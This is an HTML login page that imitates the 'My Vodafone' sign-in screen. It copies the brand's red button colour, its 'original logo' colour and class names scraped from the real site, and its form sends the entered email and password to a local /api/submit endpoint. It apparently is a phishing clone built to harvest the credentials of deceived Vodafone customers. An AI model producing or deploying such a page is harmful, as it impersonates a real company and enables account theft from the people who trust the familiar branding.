<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <style>
        /* General Styles */
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background-color: #fff; /* White background for the entire page */
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-container {
            background-color: #fff; /* White background for the container */
            border: 1px solid #333; /* Slightly thinner and lighter border */
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); /* Subtle shadow for depth */
            padding: 20px;
            width: 300px;
            text-align: left;
        }

        h1.Headingstyle__Heading-sc-1yyt9pt-0.fCCcZo {
            margin-top: 0;
            margin-bottom: 20px;
            color: #000; /* Black heading */
            font-size: 24px;
            font-weight: normal; /* Not bold */
        }

        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            max-width: 250px;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 0; /* No rounded corners */
        }

        button {
            width: 100%;
            max-width: 250px;
            padding: 10px;
            background-color: #E60000; /* Vodafone Red */
            color: #fff;
            border: none;
            cursor: pointer;
            margin-bottom: 10px;
            border-radius: 0; /* No rounded corners */
        }

        button:hover {
            background-color: #cc0000; /* Darker red on hover */
        }

        a {
            color: #057382; /* Same color as original logo */
            text-decoration: underline;
            margin-bottom: 10px;
            display: inline-block;
        }

        .secondary-button {
            background-color: transparent;
            border: 1px solid #ccc;
            color: #000; /* Black color for "Cancel" */
            border-radius: 0; /* No rounded corners */
        }

        .secondary-button:hover {
            background-color: #f2f2f2;
        }

        .forgot-password-link {
            margin-left: 0; /* Align to the left */
        }

        .create-account {
            font-weight: bold; /* Make it bold */
            margin-top: 10px;
        }
    </style>
</head>
<body>

<div class="login-container">

    <!-- Login Form -->
    <form id="login-form" action="/api/submit" method="POST">
        <h1 level="1" size="3" justify="left" appearance="primary" weight="1" headingtheme="[object Object]" data-component-name="Heading" class="Headingstyle__Heading-sc-1yyt9pt-0 fCCcZo">Log in to My Vodafone</h1>

        <!-- Email Field -->
        <label for="email">Email or username</label>
        <input type="text" id="email" name="email" placeholder="Email or username" required>

        <!-- Password Field -->
        <label for="password">Password</label>
        <input type="password" id="password" name="password" placeholder="Password" required>

        <!-- Next Button -->
        <button type="submit">Next</button>

        <!-- Forgot Password Link -->
        <a href="#" id="forgot-password" class="forgot-password-link">Forgot your password?</a>

        <!-- Create Account Section -->
        <p>Don't have an account?</p>
        <button type="button" class="secondary-button create-account" id="create-account"><strong>Create account</strong></button>

        <!-- Cancel Button -->
        <a href="#" id="cancel" style="color: #000;">Cancel</a>
    </form>
</div>

</body>
</html>
